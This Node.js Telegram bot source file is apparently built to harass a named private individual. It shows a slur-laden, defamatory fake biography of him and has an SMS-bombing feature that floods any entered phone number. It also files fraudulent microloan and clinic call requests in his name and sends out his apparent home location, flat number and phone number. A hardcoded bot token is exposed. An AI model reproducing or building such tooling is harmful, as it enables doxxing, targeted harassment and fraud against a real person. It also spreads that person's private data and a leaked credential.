process.env.NTBA_FIX_319 = 1

const TelegramBot = require('node-telegram-bot-api')
const SpamService = require('./services/SpamService')
const CallService = require('./services/CallService')
const validatePhone = require('./utils/validatePhone')

const token = '5383178738:AAFJbv76Nxkvakv6cvzWX52dlqKF4o1ojh8'
const bot = new TelegramBot(token, {polling: true})

const startOptions = {
	parse_mode: 'Markdown'
}

const defaultOptions = {
	parse_mode: 'Markdown',
	reply_markup: JSON.stringify({
		inline_keyboard: [
			[{text: 'Заказать звонок ☎️', callback_data: 'call'}],
			[{text: 'Начать рассылку 💣', callback_data: 'bomb'}],
			[{text: 'Геолокация жертвы 📍', callback_data: 'location'}, {text: 'Контакты жертвы 📞', callback_data: 'contact'}],
			[{text: '🍑🍆 Задонатить на стринги Андрею 💝👙', callback_data: 'donate'}],
			[{text: 'Записать на увеличение груди 👙', callback_data: 'call2'}]
		]
	})
}

const go = async (chatId) => {
	await bot.sendMessage(chatId, 'Не хотите ли поунижать?', defaultOptions)
}

const start = () => {
	bot.setMyCommands([
		{command: '/start', description: 'Запускает бота'},
		{command: '/menu', description: 'Вызывает меню бота'}
	])

	bot.onText(/\/start/, async msg => {
		const chatId = msg.chat.id

		await bot.sendMessage(chatId, `Добро пожаловать в *тотальное_унижение_андрэ_bot*! Мы рады видеть вас, *${msg.from.first_name}*! \nДумаю у вас мог возникнуть вопрос: зачем же мне унижать этого "Андрэ"? Возможно вы его даже не знаете. НО! Прочитайте обязательно объяснение. После этого вам все станет понятно...`, startOptions)
			.then(async () => {
				await bot.sendMessage(chatId, 'Думаю, начать стоит с биографии.')
			})
			.then(async () => {
				await bot.sendPhoto(chatId, './assets/andre.jpg', {
					caption: 'Пидор'
				}, 2000)
				.then(async () => {
					await bot.sendMessage(chatId, 'Федулов Андрей Александрович\n\nРодился в небольшом поселке в Ижевске. Его родителями были монгол и кобыла. Отец занимался грабежом, редко бывал дома и много пил. Нередко доходило до пьяных драк с мамой или сыном. Мать же работала на поле неподолеку и тягала там плуг.\n\nКак вы уже могли понять - детство Андрэ было нелегким, что очень сказалось на нем. В возрасте 6 лет он решил поднять денег на превом лохотроне. Тогда это было ещё не распространено, поэтому никто не подозреввал маленького мальчика в обмане. Суть лохотрона заключалась в том, что вы должны были сложить все драгоценности в шляпу, закрыть глаза, и через пятнадцать секунд все исчезало. Большинство людей уходило довольными, но были и те кто хотел вернуть драгоценности, однако пронырливый сучий потрох давал им лишь пинка по яйцам и хорошенько покрывал матом... Возможно вам стало интересно, как же он проворачивал этот трюк? Что ж, тут все очень просто - секрет заключался в двойном дне шляпы. Он прятал все туда, а когда емкость заполнялась перекладывал все в сундук. Думаю уже тогда будущее мальчико было понятно...\n\nЗатем, в возрасте 14 лет он начал увлекаться женщинами. Все началось с невинного дикпика однокласснице. Потом он начал к ней приставать. О дальнейших дейтвиях история умалчивает, однако ходят слухи, что на этом дело не закончилось... Затем он открыл бордель в центре питера.\n\nВ возрасте 15 лет он начал активно увлекаться гомосексуализмом. Открыл гей клуб "Ромашка" и с головой ушел в эти занятия. Все его грехи можно перечислять еще долго, но есть еще один, которым он особенно отличился. После вторжения на Украину российских войск он начал активно поддерживать путина и смертоубийства. А когда его пытались переубедить, он говорил, что его никто не понимает, но в будущем он окажется прав... Пидор он короч.\n\nДумаю теперь вам понятно почему вы просто обязаны его унизить...')
				}).then(async () => {
					await go(chatId)
				})
			})
	})

	bot.onText(/\/bomb/, async msg => {
		const chatId = msg.chat.id

		if (!SpamService.isActive) {
			await bot.sendMessage(chatId, `Введите номер телефона без знаков скобок, пробелов, тире и других лишних символов. \nПример: +79998887766, 87779996655, 78889997766`)

			bot.onText(/^((\+7|7|8)+([0-9]){10})$/, async msg => {
				const id = msg.chat.id
				const phone = validatePhone(msg.text)

				SpamService.setIsActive = true
				await bot.sendMessage(id, 'Рассылка началась! На указанный вами номер будет отправлено 50 сообщений!')

				SpamService
					.bomb(phone)
					.then(async () => {
						SpamService.setIsActive = false
						await bot.sendMessage(id, 'Рассылка успешно завершена!')
					})
					.catch(async (err) => {
						await bot.sendMessage(chatId, 'Упс. Во время отправки сообщений произошла какая-то ошибка!')
						console.log(err)
					})
			})
		} else {
			await bot.sendMessage(chatId, 'Рассылка уже запущена! вы можете запустить одновременно только одну рассылку!')
		}
	})

	bot.onText(/\/menu/, async msg => {
		const chatId = msg.chat.id

		go(chatId)
	})

	bot.on('callback_query', async msg => {
		const chatId = msg.message.chat.id
		const data = msg.data

		if (data === 'call') {
			await CallService
				.call()
				.then(() => {
					bot.sendMessage(chatId, 'Заявка на звонок для оформления микрозайма на 10 тысяч рублей для бизнеса Андрея успешно отправлена!')
				})
				.catch(err => {
					console.log(err)
					bot.sendMessage(chatId, 'Упс! Во время оформления микрозайма произошла какая-то ошибка!')
				})
		} else if (data === 'bomb') {
			await SpamService
				.bomb()
				.then(() => {
					bot.sendMessage(chatId, 'Рассылка успешно завершена')
				})
				.catch(err => {
					console.log(err)
					bot.sendMessage(chatId, 'Упс! Во время рассылки произошла какая-то ошибка!')
				})
		} else if (data === 'call2') {
			await CallService
				.call2()
				.then(async () => {
					bot.sendMessage(chatId, 'Запись на увеличение груди успешно оформлена!')
				})
				.catch(err => {
					console.log(err)
					bot.sendMessage(chatId, 'Упс! Во время записи произошла какая-то ошибка!')
				})
		} else if (data === 'location') {
			await bot.sendLocation(chatId, 59.938435, 30.277674)
			await bot.sendMessage(chatId, 'Квартира 20')
		} else if (data === 'contact') {
			await bot.sendContact(chatId, '+79811641799', 'Андрей Федулов')
		}
	})
}

start()
